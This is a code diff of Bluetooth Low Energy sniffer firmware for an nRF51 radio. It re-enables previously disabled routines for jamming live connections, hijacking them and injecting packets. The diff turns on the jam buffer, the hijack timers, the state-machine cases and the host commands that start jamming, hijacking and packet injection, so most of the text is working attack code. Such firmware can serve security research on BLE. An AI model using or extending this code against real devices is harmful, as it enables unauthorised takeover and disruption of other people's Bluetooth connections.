@@ -43,15 +43,12 @@ typedef enum {
     RECOVER_CRC,
     RECOVER_HOPINC,
     RECOVER_HOPINTER,
-    //FOLLOW,
 
     /* States for connection request sniffing. */
     SNIFF_CONNECT_REQ,
     SYNC_CONNECT,
-    //FOLLOW_CONNECT,
 
     /* States for attacks. */
-    //JAM_IDLE,
     JAM_RX,
     JAM_TX,
     HIJACK_TX,
@@ -196,10 +193,8 @@ static void reset(void);
 static void set_timer_for_next_anchor(uint32_t interval);
 static void sync_lost_track(void);
 
-#if 0
 static void hijack_hop_channel(void);
 static void hijack_prepare_packet(void);
-#endif
 
 void map_channel(int channel)
 {
@@ -252,7 +247,6 @@ void hop_tick()
 void next_adv_channel(void)
 {
   g_sniffer.ticker.detach();
-  //pLink->verbose(B("*"));
 
   if ((g_sniffer.channel >= 37) && (g_sniffer.channel <39))
   {
@@ -318,6 +312,7 @@ static void ble5_hop_tick(void)
 void hj_sync()
 {
   hops++;
+  g_sniffer.hj_ticker.rearm();
 }
 
 static void next_channel_tick()
@@ -372,7 +367,6 @@ static void start_connection_follow()
     radio_set_channel_fast(g_sniffer.channel);
 }
 
-#if 0
 static void start_hijack()
 {
   //pLink->verbose(B("JH"));
@@ -387,6 +381,7 @@ static void start_hijack()
   radio_disable();
   NVIC_SetPriority(RADIO_IRQn, IRQ_PRIORITY_HIGH);
 
+  #if 0
   /* nRF51 Series Reference Manual v2.1, section 6.1.1, page 18
 	 * PCN-083 rev.1.1
 	 *
@@ -401,6 +396,7 @@ static void start_hijack()
 		NRF_RADIO->OVERRIDE3 = NRF_FICR->BLE_1MBIT[3];
 		NRF_RADIO->OVERRIDE4 = NRF_FICR->BLE_1MBIT[4] | 0x80000000;
 	}
+  #endif 
 
   /* Compute next channel. */
   g_sniffer.channel = g_sniffer.sg->getNextChannel();
@@ -422,10 +418,9 @@ static void start_hijack()
     g_sniffer.hop_interval*1250
   );
   #endif
-  g_sniffer.hj_timer = timer_create(TIMER_REPEATED);
-  timer_start(g_sniffer.hj_timer, g_sniffer.hop_interval*1250, hijack_hop_channel);
+  
+  g_sniffer.hj_ticker.attach_us(hijack_hop_channel, g_sniffer.hop_interval*1250);
 }
-#endif
 
 int seen_aa(uint32_t aa)
 {
@@ -952,18 +947,6 @@ extern "C" void RADIO_IRQHandler(void)
                 /* Update connection event packet counter. */
                 g_sniffer.conn_evt_pkt_counter++;
 
-                /* Do we need to update connection parameters ? */
-                #if 0
-                if (g_sniffer.expect_cp_update && (g_sniffer.cp_update_instant == g_sniffer.conn_evt_counter))
-                {
-                    /* Update hop interval. */
-                    g_sniffer.hop_interval = g_sniffer.cp_update_hop_interval;
-
-                    /* Update done. */
-                    g_sniffer.expect_cp_update = false;
-                }
-                #endif
-
                 /* Are we already synchronized ? */
                 if (g_sniffer.synced == false)
                 {
@@ -981,7 +964,7 @@ extern "C" void RADIO_IRQHandler(void)
                   if (g_sniffer.jamming)
                   {
                     /* Prepare buffer. */
-                    #if 0
+                    #if 1
                     for (i=0; i<128; i++)
                       tx_buffer[i]=0x55;
                     tx_buffer[0] = 0x0f; /* LLID: 0x01, NESN: 0x01, SN: 0x01, MD: 0x00 */
@@ -994,7 +977,7 @@ extern "C" void RADIO_IRQHandler(void)
                      We inject a carefully crafted packet with correct SN & NESN
                      values, based on what we observed.
                     **/
-                    #if 1
+                    #if 0
                     //tx_buffer[0] = 0x03 | (g_sniffer.sn << 2) | (g_sniffer.nesn << 3);
                     tx_buffer[0] = 0x03 | (g_sniffer.nesn << 3) | (((g_sniffer.sn==0)?1:0) << 2);
                     tx_buffer[1] = 0x02;
@@ -1007,7 +990,7 @@ extern "C" void RADIO_IRQHandler(void)
 
                     /* Switch radio to TX and start sending. We don't need to enforce T_IFS as it
                        is roughly BTLE T_IFS (138 rather than 150). */
-                    radio_send(tx_buffer, 4);
+                    radio_send(tx_buffer, /*4*/128);
                   }
                 }
 
@@ -1083,14 +1066,7 @@ extern "C" void RADIO_IRQHandler(void)
 
                   g_sniffer.ble5_ticker.detach();
                   g_sniffer.ble5_ticker.attach_us(ble5_hop_tick, 1250);
-                  /*
-                  g_sniffer.ble5_ptimer = timer_create(TIMER_REPEATED);
 
-                  timer_start(
-                    g_sniffer.ble5_ptimer,
-                    1250,
-                    ble5_hop_tick
-                  );*/
                   snprintf(msg,30, "chan: %d (%d) (%d)", g_sniffer.channel, g_sniffer.ble5_previous_counter,g_sniffer.ble5_hop_counter);
                   pLink->verbose(B(msg));
 
@@ -1104,12 +1080,6 @@ extern "C" void RADIO_IRQHandler(void)
                   */
                   g_sniffer.channel = g_sniffer.sg->get_channel(g_sniffer.ble5_previous_counter);
 
-                  /*
-                  radio_follow_conn(
-                    g_sniffer.access_address,
-                    g_sniffer.channel,
-                    g_sniffer.crcinit
-                  );*/
                   /* Go listening on the new channel. */
 
                   NVIC_DisableIRQ(RADIO_IRQn);
@@ -1183,7 +1153,6 @@ extern "C" void RADIO_IRQHandler(void)
             }
             break;
 
-#if 0
           /* JAM_TX packet sent, reconfigure RADIO to listen. */
           case JAM_TX:
             {
@@ -1291,7 +1260,7 @@ extern "C" void RADIO_IRQHandler(void)
               }
             }
             break;
-#endif
+
           /* Do nothing by default or when idling. */
           case IDLE:
           default:
@@ -1351,13 +1320,7 @@ static void reset(void)
 
   /* Reset timers. */
   g_sniffer.ticker.detach();
-  //g_sniffer.hj_ticker.detach();
-
-  /*
-  if (g_sniffer.hj_timer >= 0)
-    timer_destroy(g_sniffer.hj_timer);
-  g_sniffer.hj_timer = -1;
-  */
+  g_sniffer.hj_ticker.detach();
 
   /* Reset jamming. */
   g_sniffer.jamming = false;
@@ -1615,7 +1578,6 @@ static void sync_lost_track(void)
   }
 
 
-#if 0
   /* Jamming successful */
   if ((g_sniffer.conn_lost_packets >= 2) && g_sniffer.hijacking)
   {
@@ -1657,11 +1619,9 @@ static void sync_lost_track(void)
       start_hijack,
       (remaining*1250 - 360)
     );
-
-    //start_hijack();
+    
     return;
   }
-#endif 
 
   /* Is there a channel map update to apply ? */
   if ((g_sniffer.action == SYNC_CONNECT) && (g_sniffer.expect_chm_update))
@@ -1713,22 +1673,6 @@ static void sync_lost_track(void)
     NRF_RADIO->EVENTS_END = 0;
     NRF_RADIO->TASKS_RXEN = 1;
   }
-
-#if 0
-  else if ((g_sniffer.action == FOLLOW) && (g_sniffer.expect_chm_update))
-  {
-    /* Copy new channel map to current channel map. */
-    for (i=0;i<37;i++)
-      g_sniffer.chm[i] = g_sniffer.chm_update[i];
-
-    /* Update sequence generator. */
-    g_sniffer.sg.updateChannelMap(g_sniffer.chm);
-
-    /* Update done. */
-    g_sniffer.expect_chm_update = false;
-  }
-#endif
-
   else {
     if (g_sniffer.csa != CSA_BLE5)
     {
@@ -1785,9 +1729,6 @@ static void sync_hop_channel(void)
   uint8_t hexbuf[128];
   uint8_t dbg[128];
   
-  //snprintf((char *)dbg, 128, "sync_hop_channel() %d", g_sniffer.channel);
-  //pLink->verbose(dbg);
-
   /* Remove timer. */
   //g_sniffer.ticker.detach();
 
@@ -1870,9 +1811,6 @@ static void sync_hop_channel(void)
 
 static void set_timer_for_next_anchor(uint32_t interval)
 {
-  //g_sniffer.ticker.detach();
-  //g_sniffer.hj_ticker.detach();
-
   g_sniffer.conn_lost_packets = 0;
 
   /* Sets a timer function to be notified when connInterval is expired. */
@@ -1882,11 +1820,10 @@ static void set_timer_for_next_anchor(uint32_t interval)
     interval
   );
 
-  //hops = 0;
-  //g_sniffer.hj_ticker.attach_us(hj_sync, 1250);
+  hops = 0;
+  g_sniffer.hj_ticker.attach_us(hj_sync, 1250);
 }
 
-#if 0
 static void hijack_prepare_packet(void)
 {
   int i=0;
@@ -1932,14 +1869,16 @@ static void hijack_hop_channel(void)
     g_sniffer.jamming = false;
 
     /* Destroy timer. */
-    timer_destroy(g_sniffer.hj_timer);
-    g_sniffer.hj_timer = -1;
+    g_sniffer.hj_ticker.detach();
 
     /* Reset. */
     reset();
 
     return;
   }
+
+  /* Rearm timer (repeat). */
+  g_sniffer.hj_ticker.rearm();
 
   /* We expect the master to be first to send a packet. */
   g_sniffer.direction = 0;
@@ -1958,11 +1897,10 @@ static void hijack_hop_channel(void)
   /* Let's start hijacking. */
   g_sniffer.action = HIJACK_TX;
 
-
   /* Send buffer. */
   radio_send_rx(tx_buffer, 2, g_sniffer.channel);
 }
-#endif
+
 
 static void chm_tick()
 {
@@ -2292,7 +2230,6 @@ static void follow_connection(void)
     );
 }
 
-#if 0
 static void send_packet(uint8_t *pPacket, int size)
 {
   int i = 0;
@@ -2314,7 +2251,6 @@ static void send_packet(uint8_t *pPacket, int size)
     pLink->verbose(B("PS"));
   }
 }
-#endif
 
 /**
  * Start Collaborative Channel Mapping.
@@ -2761,7 +2697,7 @@ void dispatchMessage(T_OPERATION op, uint8_t *payload, int nSize, uint8_t ubflag
       if ((nSize == 1) && (ubflags & PKT_COMMAND))
       {
         pLink->sendPacket(ENABLE_JAMMING, NULL, 0, PKT_COMMAND | PKT_RESPONSE);
-        //g_sniffer.jamming = (payload[0]==1);
+        g_sniffer.jamming = (payload[0]==1);
       }
       else
         pLink->sendPacket(ENABLE_JAMMING, NULL, 0, 0);
@@ -2780,8 +2716,8 @@ void dispatchMessage(T_OPERATION op, uint8_t *payload, int nSize, uint8_t ubflag
         if ((nSize == 1) && (ubflags & PKT_COMMAND))
         {
           pLink->sendPacket(ENABLE_HIJACKING, NULL, 0, PKT_COMMAND | PKT_RESPONSE);
-          //g_sniffer.hijacking = (payload[0]==1);
-          //g_sniffer.jamming = (payload[0]==1);
+          g_sniffer.hijacking = (payload[0]==1);
+          g_sniffer.jamming = (payload[0]==1);
         }
         else
           pLink->sendPacket(ENABLE_HIJACKING, NULL, 0, 0);
@@ -2797,7 +2733,7 @@ void dispatchMessage(T_OPERATION op, uint8_t *payload, int nSize, uint8_t ubflag
         if ((nSize >= 1) && (ubflags & PKT_COMMAND) && g_sniffer.hijacked)
         {
           /* Bufferize packet. */
-          //send_packet(payload, nSize);
+          send_packet(payload, nSize);
 
           /* Send ACK. */
           pLink->sendPacket(SEND_PKT, NULL, 0, PKT_COMMAND | PKT_RESPONSE);
@@ -2834,7 +2770,7 @@ void dispatchMessage(T_OPERATION op, uint8_t *payload, int nSize, uint8_t ubflag
           }
 
           /* Enable CCHM mode. */
-          //start_cchm(accessAddress, crcInit);
+          start_cchm(accessAddress, crcInit);
 
           /* Send ACK. */
           pLink->sendPacket(COLLAB_CHM, NULL, 0, PKT_COMMAND | PKT_RESPONSE);
